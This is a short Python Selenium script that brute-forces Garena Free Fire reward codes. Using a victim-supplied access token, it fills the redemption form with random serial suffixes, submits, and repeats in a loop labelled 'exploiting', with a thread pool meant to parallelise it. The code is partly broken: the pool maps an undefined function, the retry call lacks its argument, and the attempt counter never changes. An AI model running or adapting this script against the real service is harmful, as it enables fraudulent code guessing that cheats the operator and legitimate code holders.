from selenium import webdriver
import random
import time
import requests
from multiprocessing.dummy import Pool
from multiprocessing import Lock
try:
  import numpy as np
except ImportError:
  import os
  os.system("pip install numpy")
  import numpy as np
s=0
class Free:
 def __init__(self,drive,token,link="https://reward.ff.garena.com/?access_token="):
   link="https://reward.ff.garena.com/?access_token="
   self.drive=drive
   self.token=token
   link= link+token
   self.link=link
   time.sleep(2)
   self.li_st=np.arange(20000)
 def randome():
    myList=['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','0','1','2','3','4','5','6','7','8','9']
    c=""
    d=0
    while d<4:
      d=d+1
      k=random.choice(myList)
      c=c+k
    return c
 def exploiting(self,X):
    driver = webdriver.Chrome(self.drive)
    browser=driver.get(self.link)
    time.sleep(4.2)
    driver.refresh()
    while True:
     try:
      b=Free.randome()
      c=Free.randome()
      driver.find_element_by_id("input_serial_1").send_keys("8FF8")
      driver.find_element_by_id("input_serial_2").send_keys(b)
      driver.find_element_by_id("input_serial_3").send_keys(c)
      driver.find_element_by_class_name("confirm-btn").click()
      time.sleep(0.9)
#      driver.refresh()
      driver.get(self.link)
      time.sleep(1)
     except KeyboardInterrupt:
      print("you tried",s, "times")
      quit()
     except:
      driver.quit()
      Free(self.drive,self.token).exploiting()
      print("a problem had popped out :")
 def multiprocessing(self):
      pool= Pool(5)
      pool.imap(exploiting,self.li_st)
#      print("you tried",s, "times")
#     s=s+1
# exploiting(link,s)
-
